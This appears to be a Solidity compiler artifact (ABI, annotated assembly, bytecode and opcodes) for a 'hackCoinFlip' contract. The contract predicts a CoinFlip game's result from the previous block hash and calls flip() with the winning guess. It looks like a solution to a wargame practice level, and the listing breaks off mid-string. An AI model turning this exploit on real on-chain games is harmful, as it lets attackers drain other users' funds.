{
	"contracts/3_CoinFlip.sol": {
		"hackCoinFlip": {
			"abi": [
				{
					"inputs": [
						{
							"internalType": "bool",
							"name": "_guess",
							"type": "bool"
						}
					],
					"name": "hackFlip",
					"outputs": [],
					"stateMutability": "nonpayable",
					"type": "function"
				},
				{
					"inputs": [],
					"name": "originalContract",
					"outputs": [
						{
							"internalType": "contract ICoinFlip",
							"name": "",
							"type": "address"
						}
					],
					"stateMutability": "view",
					"type": "function"
				}
			],
			"devdoc": {
				"kind": "dev",
				"methods": {},
				"version": 1
			},
			"evm": {
				"assembly": "    /* \"contracts/3_CoinFlip.sol\":137:717  contract hackCoinFlip {... */\n  mstore(0x40, 0x80)\n    /* \"contracts/3_CoinFlip.sol\":211:253  0xC6595CAE61422df5c9189dea986490c083561241 */\n  0xc6595cae61422df5c9189dea986490c083561241\n    /* \"contracts/3_CoinFlip.sol\":165:254  ICoinFlip public originalContract = ICoinFlip(0xC6595CAE61422df5c9189dea986490c083561241) */\n  0x00\n  dup1\n  0x0100\n  exp\n  dup2\n  sload\n  dup2\n  0xffffffffffffffffffffffffffffffffffffffff\n  mul\n  not\n  and\n  swap1\n  dup4\n  0xffffffffffffffffffffffffffffffffffffffff\n  and\n  mul\n  or\n  swap1\n  sstore\n  pop\n    /* \"contracts/3_CoinFlip.sol\":278:355  57896044618658097711785492504343953926634992332820282019728792003956564819968 */\n  0x8000000000000000000000000000000000000000000000000000000000000000\n    /* \"contracts/3_CoinFlip.sol\":261:355  uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968 */\n  0x01\n  sstore\n    /* \"contracts/3_CoinFlip.sol\":137:717  contract hackCoinFlip {... */\n  callvalue\n  dup1\n  iszero\n  tag_1\n  jumpi\n  0x00\n  dup1\n  revert\ntag_1:\n  pop\n  dataSize(sub_0)\n  dup1\n  dataOffset(sub_0)\n  0x00\n  codecopy\n  0x00\n  return\nstop\n\nsub_0: assembly {\n        /* \"contracts/3_CoinFlip.sol\":137:717  contract hackCoinFlip {... */\n      mstore(0x40, 0x80)\n      callvalue\n      dup1\n      iszero\n      tag_1\n      jumpi\n      0x00\n      dup1\n      revert\n    tag_1:\n      pop\n      jumpi(tag_2, lt(calldatasize, 0x04))\n      shr(0xe0, calldataload(0x00))\n      dup1\n      0x367dea34\n      eq\n      tag_3\n      jumpi\n      dup1\n      0xe2c345e2\n      eq\n      tag_4\n      jumpi\n    tag_2:\n      0x00\n      dup1\n      revert\n        /* \"contracts/3_CoinFlip.sol\":362:715  function hackFlip(bool _guess) public {... */\n    tag_3:\n      tag_5\n      0x04\n      dup1\n      calldatasize\n      sub\n      dup2\n      add\n      swap1\n      tag_6\n      swap2\n      swap1\n      tag_7\n      jump\t// in\n    tag_6:\n      tag_8\n      jump\t// in\n    tag_5:\n      stop\n        /* \"contracts/3_CoinFlip.sol\":165:254  ICoinFlip public originalContract = ICoinFlip(0xC6595CAE61422df5c9189dea986490c083561241) */\n    tag_4:\n      tag_9\n      tag_10\n      jump\t// in\n    tag_9:\n      mload(0x40)\n      tag_11\n      swap2\n      swap1\n      tag_12\n      jump\t// in\n    tag_11:\n      mload(0x40)\n      dup1\n      swap2\n      sub\n      swap1\n      return\n        /* \"contracts/3_CoinFlip.sol\":362:715  function hackFlip(bool _guess) public {... */\n    tag_8:\n        /* \"contracts/3_CoinFlip.sol\":410:428  uint256 blockValue */\n      0x00\n        /* \"contracts/3_CoinFlip.sol\":464:465  1 */\n      0x01\n        /* \"contracts/3_CoinFlip.sol\":449:461  block.number */\n      number\n        /* \"contracts/3_CoinFlip.sol\":449:465  block.number - 1 */\n      tag_14\n      swap2\n      swap1\n      tag_15\n      jump\t// in\n    tag_14:\n        /* \"contracts/3_CoinFlip.sol\":439:466  blockhash(block.number - 1) */\n      blockhash\n        /* \"contracts/3_CoinFlip.sol\":431:467  uint256(blockhash(block.number - 1)) */\n      0x00\n      shr\n        /* \"contracts/3_CoinFlip.sol\":410:467  uint256 blockValue = uint256(blockhash(block.number - 1)) */\n      swap1\n      pop\n        /* \"contracts/3_CoinFlip.sol\":477:493  uint256 coinFlip */\n      0x00\n        /* \"contracts/3_CoinFlip.sol\":509:515  FACTOR */\n      sload(0x01)\n        /* \"contracts/3_CoinFlip.sol\":496:506  blockValue */\n      dup3\n        /* \"contracts/3_CoinFlip.sol\":496:515  blockValue / FACTOR */\n      tag_16\n      swap2\n      swap1\n      tag_17\n      jump\t// in\n    tag_16:\n        /* \"contracts/3_CoinFlip.sol\":477:515  uint256 coinFlip = blockValue / FACTOR */\n      swap1\n      pop\n        /* \"contracts/3_CoinFlip.sol\":525:534  bool side */\n      0x00\n        /* \"contracts/3_CoinFlip.sol\":549:550  1 */\n      0x01\n        /* \"contracts/3_CoinFlip.sol\":537:545  coinFlip */\n      dup3\n        /* \"contracts/3_CoinFlip.sol\":537:550  coinFlip == 1 */\n      eq\n        /* \"contracts/3_CoinFlip.sol\":537:564  coinFlip == 1 ? true: false */\n      tag_18\n      jumpi\n        /* \"contracts/3_CoinFlip.sol\":559:564  false */\n      0x00\n        /* \"contracts/3_CoinFlip.sol\":537:564  coinFlip == 1 ? true: false */\n      jump(tag_19)\n    tag_18:\n        /* \"contracts/3_CoinFlip.sol\":553:557  true */\n      0x01\n        /* \"contracts/3_CoinFlip.sol\":537:564  coinFlip == 1 ? true: false */\n    tag_19:\n        /* \"contracts/3_CoinFlip.sol\":525:564  bool side = coinFlip == 1 ? true: false */\n      swap1\n      pop\n        /* \"contracts/3_CoinFlip.sol\":587:593  _guess */\n      dup4\n        /* \"contracts/3_CoinFlip.sol\":579:593  side == _guess */\n      iszero\n      iszero\n        /* \"contracts/3_CoinFlip.sol\":579:583  side */\n      dup2\n        /* \"contracts/3_CoinFlip.sol\":579:593  side == _guess */\n      iszero\n      iszero\n      sub\n        /* \"contracts/3_CoinFlip.sol\":575:708  if (side == _guess){... */\n      tag_20\n      jumpi\n        /* \"contracts/3_CoinFlip.sol\":608:624  originalContract */\n      0x00\n      dup1\n      sload\n      swap1\n      0x0100\n      exp\n      swap1\n      div\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n        /* \"contracts/3_CoinFlip.sol\":608:629  originalContract.flip */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      0x1d263f67\n        /* \"contracts/3_CoinFlip.sol\":630:636  _guess */\n      dup6\n        /* \"contracts/3_CoinFlip.sol\":608:637  originalContract.flip(_guess) */\n      mload(0x40)\n      dup3\n      0xffffffff\n      and\n      0xe0\n      shl\n      dup2\n      mstore\n      0x04\n      add\n      tag_21\n      swap2\n      swap1\n      tag_22\n      jump\t// in\n    tag_21:\n      0x20\n      mload(0x40)\n      dup1\n      dup4\n      sub\n      dup2\n      0x00\n      dup8\n      gas\n      call\n      iszero\n      dup1\n      iszero\n      tag_24\n      jumpi\n      returndatasize\n      0x00\n      dup1\n      returndatacopy\n      revert(0x00, returndatasize)\n    tag_24:\n      pop\n      pop\n      pop\n      pop\n      mload(0x40)\n      returndatasize\n      not(0x1f)\n      0x1f\n      dup3\n      add\n      and\n      dup3\n      add\n      dup1\n      0x40\n      mstore\n      pop\n      dup2\n      add\n      swap1\n      tag_25\n      swap2\n      swap1\n      tag_26\n      jump\t// in\n    tag_25:\n      pop\n        /* \"contracts/3_CoinFlip.sol\":575:708  if (side == _guess){... */\n      jump(tag_27)\n    tag_20:\n        /* \"contracts/3_CoinFlip.sol\":667:683  originalContract */\n      0x00\n      dup1\n      sload\n      swap1\n      0x0100\n      exp\n      swap1\n      div\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n        /* \"contracts/3_CoinFlip.sol\":667:688  originalContract.flip */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      0x1d263f67\n        /* \"contracts/3_CoinFlip.sol\":690:696  _guess */\n      dup6\n        /* \"contracts/3_CoinFlip.sol\":689:696  !_guess */\n      iszero\n        /* \"contracts/3_CoinFlip.sol\":667:697  originalContract.flip(!_guess) */\n      mload(0x40)\n      dup3\n      0xffffffff\n      and\n      0xe0\n      shl\n      dup2\n      mstore\n      0x04\n      add\n      tag_28\n      swap2\n      swap1\n      tag_22\n      jump\t// in\n    tag_28:\n      0x20\n      mload(0x40)\n      dup1\n      dup4\n      sub\n      dup2\n      0x00\n      dup8\n      gas\n      call\n      iszero\n      dup1\n      iszero\n      tag_30\n      jumpi\n      returndatasize\n      0x00\n      dup1\n      returndatacopy\n      revert(0x00, returndatasize)\n    tag_30:\n      pop\n      pop\n      pop\n      pop\n      mload(0x40)\n      returndatasize\n      not(0x1f)\n      0x1f\n      dup3\n      add\n      and\n      dup3\n      add\n      dup1\n      0x40\n      mstore\n      pop\n      dup2\n      add\n      swap1\n      tag_31\n      swap2\n      swap1\n      tag_26\n      jump\t// in\n    tag_31:\n      pop\n        /* \"contracts/3_CoinFlip.sol\":575:708  if (side == _guess){... */\n    tag_27:\n        /* \"contracts/3_CoinFlip.sol\":400:715  {... */\n      pop\n      pop\n      pop\n        /* \"contracts/3_CoinFlip.sol\":362:715  function hackFlip(bool _guess) public {... */\n      pop\n      jump\t// out\n        /* \"contracts/3_CoinFlip.sol\":165:254  ICoinFlip public originalContract = ICoinFlip(0xC6595CAE61422df5c9189dea986490c083561241) */\n    tag_10:\n      0x00\n      dup1\n      sload\n      swap1\n      0x0100\n      exp\n      swap1\n      div\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      dup2\n      jump\t// out\n        /* \"#utility.yul\":88:205   */\n    tag_33:\n        /* \"#utility.yul\":197:198   */\n      0x00\n        /* \"#utility.yul\":194:195   */\n      dup1\n        /* \"#utility.yul\":187:199   */\n      revert\n        /* \"#utility.yul\":334:424   */\n    tag_35:\n        /* \"#utility.yul\":368:375   */\n      0x00\n        /* \"#utility.yul\":411:416   */\n      dup2\n        /* \"#utility.yul\":404:417   */\n      iszero\n        /* \"#utility.yul\":397:418   */\n      iszero\n        /* \"#utility.yul\":386:418   */\n      swap1\n      pop\n        /* \"#utility.yul\":334:424   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":430:546   */\n    tag_36:\n        /* \"#utility.yul\":500:521   */\n      tag_55\n        /* \"#utility.yul\":515:520   */\n      dup2\n        /* \"#utility.yul\":500:521   */\n      tag_35\n      jump\t// in\n    tag_55:\n        /* \"#utility.yul\":493:498   */\n      dup2\n        /* \"#utility.yul\":490:522   */\n      eq\n        /* \"#utility.yul\":480:540   */\n      tag_56\n      jumpi\n        /* \"#utility.yul\":536:537   */\n      0x00\n        /* \"#utility.yul\":533:534   */\n      dup1\n        /* \"#utility.yul\":526:538   */\n      revert\n        /* \"#utility.yul\":480:540   */\n    tag_56:\n        /* \"#utility.yul\":430:546   */\n      pop\n      jump\t// out\n        /* \"#utility.yul\":552:685   */\n    tag_37:\n        /* \"#utility.yul\":595:600   */\n      0x00\n        /* \"#utility.yul\":633:639   */\n      dup2\n        /* \"#utility.yul\":620:640   */\n      calldataload\n        /* \"#utility.yul\":611:640   */\n      swap1\n      pop\n        /* \"#utility.yul\":649:679   */\n      tag_58\n        /* \"#utility.yul\":673:678   */\n      dup2\n        /* \"#utility.yul\":649:679   */\n      tag_36\n      jump\t// in\n    tag_58:\n        /* \"#utility.yul\":552:685   */\n      swap3\n      swap2\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":691:1014   */\n    tag_7:\n        /* \"#utility.yul\":747:753   */\n      0x00\n        /* \"#utility.yul\":796:798   */\n      0x20\n        /* \"#utility.yul\":784:793   */\n      dup3\n        /* \"#utility.yul\":775:782   */\n      dup5\n        /* \"#utility.yul\":771:794   */\n      sub\n        /* \"#utility.yul\":767:799   */\n      slt\n        /* \"#utility.yul\":764:883   */\n      iszero\n      tag_60\n      jumpi\n        /* \"#utility.yul\":802:881   */\n      tag_61\n      tag_33\n      jump\t// in\n    tag_61:\n        /* \"#utility.yul\":764:883   */\n    tag_60:\n        /* \"#utility.yul\":922:923   */\n      0x00\n        /* \"#utility.yul\":947:997   */\n      tag_62\n        /* \"#utility.yul\":989:996   */\n      dup5\n        /* \"#utility.yul\":980:986   */\n      dup3\n        /* \"#utility.yul\":969:978   */\n      dup6\n        /* \"#utility.yul\":965:987   */\n      add\n        /* \"#utility.yul\":947:997   */\n      tag_37\n      jump\t// in\n    tag_62:\n        /* \"#utility.yul\":937:997   */\n      swap2\n      pop\n        /* \"#utility.yul\":893:1007   */\n      pop\n        /* \"#utility.yul\":691:1014   */\n      swap3\n      swap2\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":1020:1146   */\n    tag_38:\n        /* \"#utility.yul\":1057:1064   */\n      0x00\n        /* \"#utility.yul\":1097:1139   */\n      0xffffffffffffffffffffffffffffffffffffffff\n        /* \"#utility.yul\":1090:1095   */\n      dup3\n        /* \"#utility.yul\":1086:1140   */\n      and\n        /* \"#utility.yul\":1075:1140   */\n      swap1\n      pop\n        /* \"#utility.yul\":1020:1146   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":1152:1212   */\n    tag_39:\n        /* \"#utility.yul\":1180:1183   */\n      0x00\n        /* \"#utility.yul\":1201:1206   */\n      dup2\n        /* \"#utility.yul\":1194:1206   */\n      swap1\n      pop\n        /* \"#utility.yul\":1152:1212   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":1218:1360   */\n    tag_40:\n        /* \"#utility.yul\":1268:1277   */\n      0x00\n        /* \"#utility.yul\":1301:1354   */\n      tag_66\n        /* \"#utility.yul\":1319:1353   */\n      tag_67\n        /* \"#utility.yul\":1328:1352   */\n      tag_68\n        /* \"#utility.yul\":1346:1351   */\n      dup5\n        /* \"#utility.yul\":1328:1352   */\n      tag_38\n      jump\t// in\n    tag_68:\n        /* \"#utility.yul\":1319:1353   */\n      tag_39\n      jump\t// in\n    tag_67:\n        /* \"#utility.yul\":1301:1354   */\n      tag_38\n      jump\t// in\n    tag_66:\n        /* \"#utility.yul\":1288:1354   */\n      swap1\n      pop\n        /* \"#utility.yul\":1218:1360   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":1366:1492   */\n    tag_41:\n        /* \"#utility.yul\":1416:1425   */\n      0x00\n        /* \"#utility.yul\":1449:1486   */\n      tag_70\n        /* \"#utility.yul\":1480:1485   */\n      dup3\n        /* \"#utility.yul\":1449:1486   */\n      tag_40\n      jump\t// in\n    tag_70:\n        /* \"#utility.yul\":1436:1486   */\n      swap1\n      pop\n        /* \"#utility.yul\":1366:1492   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":1498:1639   */\n    tag_42:\n        /* \"#utility.yul\":1563:1572   */\n      0x00\n        /* \"#utility.yul\":1596:1633   */\n      tag_72\n        /* \"#utility.yul\":1627:1632   */\n      dup3\n        /* \"#utility.yul\":1596:1633   */\n      tag_41\n      jump\t// in\n    tag_72:\n        /* \"#utility.yul\":1583:1633   */\n      swap1\n      pop\n        /* \"#utility.yul\":1498:1639   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":1645:1806   */\n    tag_43:\n        /* \"#utility.yul\":1747:1799   */\n      tag_74\n        /* \"#utility.yul\":1793:1798   */\n      dup2\n        /* \"#utility.yul\":1747:1799   */\n      tag_42\n      jump\t// in\n    tag_74:\n        /* \"#utility.yul\":1742:1745   */\n      dup3\n        /* \"#utility.yul\":1735:1800   */\n      mstore\n        /* \"#utility.yul\":1645:1806   */\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":1812:2064   */\n    tag_12:\n        /* \"#utility.yul\":1920:1924   */\n      0x00\n        /* \"#utility.yul\":1958:1960   */\n      0x20\n        /* \"#utility.yul\":1947:1956   */\n      dup3\n        /* \"#utility.yul\":1943:1961   */\n      add\n        /* \"#utility.yul\":1935:1961   */\n      swap1\n      pop\n        /* \"#utility.yul\":1971:2057   */\n      tag_76\n        /* \"#utility.yul\":2054:2055   */\n      0x00\n        /* \"#utility.yul\":2043:2052   */\n      dup4\n        /* \"#utility.yul\":2039:2056   */\n      add\n        /* \"#utility.yul\":2030:2036   */\n      dup5\n        /* \"#utility.yul\":1971:2057   */\n      tag_43\n      jump\t// in\n    tag_76:\n        /* \"#utility.yul\":1812:2064   */\n      swap3\n      swap2\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":2070:2147   */\n    tag_44:\n        /* \"#utility.yul\":2107:2114   */\n      0x00\n        /* \"#utility.yul\":2136:2141   */\n      dup2\n        /* \"#utility.yul\":2125:2141   */\n      swap1\n      pop\n        /* \"#utility.yul\":2070:2147   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":2153:2333   */\n    tag_45:\n        /* \"#utility.yul\":2201:2278   */\n      0x4e487b7100000000000000000000000000000000000000000000000000000000\n        /* \"#utility.yul\":2198:2199   */\n      0x00\n        /* \"#utility.yul\":2191:2279   */\n      mstore\n        /* \"#utility.yul\":2298:2302   */\n      0x11\n        /* \"#utility.yul\":2295:2296   */\n      0x04\n        /* \"#utility.yul\":2288:2303   */\n      mstore\n        /* \"#utility.yul\":2322:2326   */\n      0x24\n        /* \"#utility.yul\":2319:2320   */\n      0x00\n        /* \"#utility.yul\":2312:2327   */\n      revert\n        /* \"#utility.yul\":2339:2530   */\n    tag_15:\n        /* \"#utility.yul\":2379:2383   */\n      0x00\n        /* \"#utility.yul\":2399:2419   */\n      tag_80\n        /* \"#utility.yul\":2417:2418   */\n      dup3\n        /* \"#utility.yul\":2399:2419   */\n      tag_44\n      jump\t// in\n    tag_80:\n        /* \"#utility.yul\":2394:2419   */\n      swap2\n      pop\n        /* \"#utility.yul\":2433:2453   */\n      tag_81\n        /* \"#utility.yul\":2451:2452   */\n      dup4\n        /* \"#utility.yul\":2433:2453   */\n      tag_44\n      jump\t// in\n    tag_81:\n        /* \"#utility.yul\":2428:2453   */\n      swap3\n      pop\n        /* \"#utility.yul\":2472:2473   */\n      dup3\n        /* \"#utility.yul\":2469:2470   */\n      dup3\n        /* \"#utility.yul\":2466:2474   */\n      lt\n        /* \"#utility.yul\":2463:2497   */\n      iszero\n      tag_82\n      jumpi\n        /* \"#utility.yul\":2477:2495   */\n      tag_83\n      tag_45\n      jump\t// in\n    tag_83:\n        /* \"#utility.yul\":2463:2497   */\n    tag_82:\n        /* \"#utility.yul\":2522:2523   */\n      dup3\n        /* \"#utility.yul\":2519:2520   */\n      dup3\n        /* \"#utility.yul\":2515:2524   */\n      sub\n        /* \"#utility.yul\":2507:2524   */\n      swap1\n      pop\n        /* \"#utility.yul\":2339:2530   */\n      swap3\n      swap2\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":2536:2716   */\n    tag_46:\n        /* \"#utility.yul\":2584:2661   */\n      0x4e487b7100000000000000000000000000000000000000000000000000000000\n        /* \"#utility.yul\":2581:2582   */\n      0x00\n        /* \"#utility.yul\":2574:2662   */\n      mstore\n        /* \"#utility.yul\":2681:2685   */\n      0x12\n        /* \"#utility.yul\":2678:2679   */\n      0x04\n        /* \"#utility.yul\":2671:2686   */\n      mstore\n        /* \"#utility.yul\":2705:2709   */\n      0x24\n        /* \"#utility.yul\":2702:2703   */\n      0x00\n        /* \"#utility.yul\":2695:2710   */\n      revert\n        /* \"#utility.yul\":2722:2907   */\n    tag_17:\n        /* \"#utility.yul\":2762:2763   */\n      0x00\n        /* \"#utility.yul\":2779:2799   */\n      tag_86\n        /* \"#utility.yul\":2797:2798   */\n      dup3\n        /* \"#utility.yul\":2779:2799   */\n      tag_44\n      jump\t// in\n    tag_86:\n        /* \"#utility.yul\":2774:2799   */\n      swap2\n      pop\n        /* \"#utility.yul\":2813:2833   */\n      tag_87\n        /* \"#utility.yul\":2831:2832   */\n      dup4\n        /* \"#utility.yul\":2813:2833   */\n      tag_44\n      jump\t// in\n    tag_87:\n        /* \"#utility.yul\":2808:2833   */\n      swap3\n      pop\n        /* \"#utility.yul\":2852:2853   */\n      dup3\n        /* \"#utility.yul\":2842:2877   */\n      tag_88\n      jumpi\n        /* \"#utility.yul\":2857:2875   */\n      tag_89\n      tag_46\n      jump\t// in\n    tag_89:\n        /* \"#utility.yul\":2842:2877   */\n    tag_88:\n        /* \"#utility.yul\":2899:2900   */\n      dup3\n        /* \"#utility.yul\":2896:2897   */\n      dup3\n        /* \"#utility.yul\":2892:2901   */\n      div\n        /* \"#utility.yul\":2887:2901   */\n      swap1\n      pop\n        /* \"#utility.yul\":2722:2907   */\n      swap3\n      swap2\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":2913:3022   */\n    tag_47:\n        /* \"#utility.yul\":2994:3015   */\n      tag_91\n        /* \"#utility.yul\":3009:3014   */\n      dup2\n        /* \"#utility.yul\":2994:3015   */\n      tag_35\n      jump\t// in\n    tag_91:\n        /* \"#utility.yul\":2989:2992   */\n      dup3\n        /* \"#utility.yul\":2982:3016   */\n      mstore\n        /* \"#utility.yul\":2913:3022   */\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":3028:3238   */\n    tag_22:\n        /* \"#utility.yul\":3115:3119   */\n      0x00\n        /* \"#utility.yul\":3153:3155   */\n      0x20\n        /* \"#utility.yul\":3142:3151   */\n      dup3\n        /* \"#utility.yul\":3138:3156   */\n      add\n        /* \"#utility.yul\":3130:3156   */\n      swap1\n      pop\n        /* \"#utility.yul\":3166:3231   */\n      tag_93\n        /* \"#utility.yul\":3228:3229   */\n      0x00\n        /* \"#utility.yul\":3217:3226   */\n      dup4\n        /* \"#utility.yul\":3213:3230   */\n      add\n        /* \"#utility.yul\":3204:3210   */\n      dup5\n        /* \"#utility.yul\":3166:3231   */\n      tag_47\n      jump\t// in\n    tag_93:\n        /* \"#utility.yul\":3028:3238   */\n      swap3\n      swap2\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":3244:3381   */\n    tag_48:\n        /* \"#utility.yul\":3298:3303   */\n      0x00\n        /* \"#utility.yul\":3329:3335   */\n      dup2\n        /* \"#utility.yul\":3323:3336   */\n      mload\n        /* \"#utility.yul\":3314:3336   */\n      swap1\n      pop\n        /* \"#utility.yul\":3345:3375   */\n      tag_95\n        /* \"#utility.yul\":3369:3374   */\n      dup2\n        /* \"#utility.yul\":3345:3375   */\n      tag_36\n      jump\t// in\n    tag_95:\n        /* \"#utility.yul\":3244:3381   */\n      swap3\n      swap2\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":3387:3732   */\n    tag_26:\n        /* \"#utility.yul\":3454:3460   */\n      0x00\n        /* \"#utility.yul\":3503:3505   */\n      0x20\n        /* \"#utility.yul\":3491:3500   */\n      dup3\n        /* \"#utility.yul\":3482:3489   */\n      dup5\n        /* \"#utility.yul\":3478:3501   */\n      sub\n        /* \"#utility.yul\":3474:3506   */\n      slt\n        /* \"#utility.yul\":3471:3590   */\n      iszero\n      tag_97\n      jumpi\n        /* \"#utility.yul\":3509:3588   */\n      tag_98\n      tag_33\n      jump\t// in\n    tag_98:\n        /* \"#utility.yul\":3471:3590   */\n    tag_97:\n        /* \"#utility.yul\":3629:3630   */\n      0x00\n        /* \"#utility.yul\":3654:3715   */\n      tag_99\n        /* \"#utility.yul\":3707:3714   */\n      dup5\n        /* \"#utility.yul\":3698:3704   */\n      dup3\n        /* \"#utility.yul\":3687:3696   */\n      dup6\n        /* \"#utility.yul\":3683:3705   */\n      add\n        /* \"#utility.yul\":3654:3715   */\n      tag_48\n      jump\t// in\n    tag_99:\n        /* \"#utility.yul\":3644:3715   */\n      swap2\n      pop\n        /* \"#utility.yul\":3600:3725   */\n      pop\n        /* \"#utility.yul\":3387:3732   */\n      swap3\n      swap2\n      pop\n      pop\n      jump\t// out\n\n    auxdata: 0xa264697066735822122044078e87187301871298e49f5f8d049073039aba28f7d14ab74fdb4e34aaa15b64736f6c634300080d0033\n}\n",
				"bytecode": {
					"linkReferences": {},
					"object": "608060405273c6595cae61422df5c9189dea986490c0835612416000806101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff1602179055507f800000000000000000000000000000000000000000000000000000000000000060015534801561008857600080fd5b5061049b806100986000396000f3fe608060405234801561001057600080fd5b50600436106100365760003560e01c8063367dea341461003b578063e2c345e214610057575b600080fd5b61005560048036038101906100509190610265565b610075565b005b61005f610204565b60405161006c9190610311565b60405180910390f35b60006001436100849190610365565b4060001c905060006001548261009a91906103c8565b90506000600182146100ad5760006100b0565b60015b90508315158115150361015f5760008054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16631d263f67856040518263ffffffff1660e01b81526004016101169190610408565b6020604051808303816000875af1158015610135573d6000803e3d6000fd5b505050506040513d601f19601f820116820180604052508101906101599190610438565b506101fe565b60008054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16631d263f6785156040518263ffffffff1660e01b81526004016101b99190610408565b6020604051808303816000875af11580156101d8573d6000803e3d6000fd5b505050506040513d601f19601f820116820180604052508101906101fc9190610438565b505b50505050565b60008054906101000a900473ffffffffffffffffffffffffffffffffffffffff1681565b600080fd5b60008115159050919050565b6102428161022d565b811461024d57600080fd5b50565b60008135905061025f81610239565b92915050565b60006020828403121561027b5761027a610228565b5b600061028984828501610250565b91505092915050565b600073ffffffffffffffffffffffffffffffffffffffff82169050919050565b6000819050919050565b60006102d76102d26102cd84610292565b6102b2565b610292565b9050919050565b60006102e9826102bc565b9050919050565b60006102fb826102de565b9050919050565b61030b816102f0565b82525050565b60006020820190506103266000830184610302565b92915050565b6000819050919050565b7f4e487b7100000000000000000000000000000000000000000000000000000000600052601160045260246000fd5b60006103708261032c565b915061037b8361032c565b92508282101561038e5761038d610336565b5b828203905092915050565b7f4e487b7100000000000000000000000000000000000000000000000000000000600052601260045260246000fd5b60006103d38261032c565b91506103de8361032c565b9250826103ee576103ed610399565b5b828204905092915050565b6104028161022d565b82525050565b600060208201905061041d60008301846103f9565b92915050565b60008151905061043281610239565b92915050565b60006020828403121561044e5761044d610228565b5b600061045c84828501610423565b9150509291505056fea264697066735822122044078e87187301871298e49f5f8d049073039aba28f7d14ab74fdb4e34aaa15b64736f6c634300080d0033",
					"opcodes": "PUSH1 0x80 PUSH1 0x40 MSTORE PUSH20 0xC6595CAE61422DF5C9189DEA986490C083561241 PUSH1 0x0 DUP1 PUSH2 0x100 EXP DUP2 SLOAD DUP2 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF MUL NOT AND SWAP1 DUP4 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND MUL OR SWAP1 SSTORE POP PUSH32 0x8000000000000000000000000000000000000000000000000000000000000000 PUSH1 0x1 SSTORE CALLVALUE DUP1 ISZERO PUSH2 0x88 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH2 0x49B DUP1 PUSH2 0x98 PUSH1 0x0 CODECOPY PUSH1 0x0 RETURN INVALID PUSH1 0x80 PUSH1 0x40 MSTORE CALLVALUE DUP1 ISZERO PUSH2 0x10 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH1 0x4 CALLDATASIZE LT PUSH2 0x36 JUMPI PUSH1 0x0 CALLDATALOAD PUSH1 0xE0 SHR DUP1 PUSH4 0x367DEA34 EQ PUSH2 0x3B JUMPI DUP1 PUSH4 0xE2C345E2 EQ PUSH2 0x57 JUMPI JUMPDEST PUSH1 0x0 DUP1 REVERT JUMPDEST PUSH2 0x55 PUSH1 0x4 DUP1 CALLDATASIZE SUB DUP2 ADD SWAP1 PUSH2 0x50 SWAP2 SWAP1 PUSH2 0x265 JUMP JUMPDEST PUSH2 0x75 JUMP JUMPDEST STOP JUMPDEST PUSH2 0x5F PUSH2 0x204 JUMP JUMPDEST PUSH1 0x40 MLOAD PUSH2 0x6C SWAP2 SWAP1 PUSH2 0x311 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST PUSH1 0x0 PUSH1 0x1 NUMBER PUSH2 0x84 SWAP2 SWAP1 PUSH2 0x365 JUMP JUMPDEST BLOCKHASH PUSH1 0x0 SHR SWAP1 POP PUSH1 0x0 PUSH1 0x1 SLOAD DUP3 PUSH2 0x9A SWAP2 SWAP1 PUSH2 0x3C8 JUMP JUMPDEST SWAP1 POP PUSH1 0x0 PUSH1 0x1 DUP3 EQ PUSH2 0xAD JUMPI PUSH1 0x0 PUSH2 0xB0 JUMP JUMPDEST PUSH1 0x1 JUMPDEST SWAP1 POP DUP4 ISZERO ISZERO DUP2 ISZERO ISZERO SUB PUSH2 0x15F JUMPI PUSH1 0x0 DUP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH4 0x1D263F67 DUP6 PUSH1 0x40 MLOAD DUP3 PUSH4 0xFFFFFFFF AND PUSH1 0xE0 SHL DUP2 MSTORE PUSH1 0x4 ADD PUSH2 0x116 SWAP2 SWAP1 PUSH2 0x408 JUMP JUMPDEST PUSH1 0x20 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 PUSH1 0x0 DUP8 GAS CALL ISZERO DUP1 ISZERO PUSH2 0x135 JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP POP POP POP PUSH1 0x40 MLOAD RETURNDATASIZE PUSH1 0x1F NOT PUSH1 0x1F DUP3 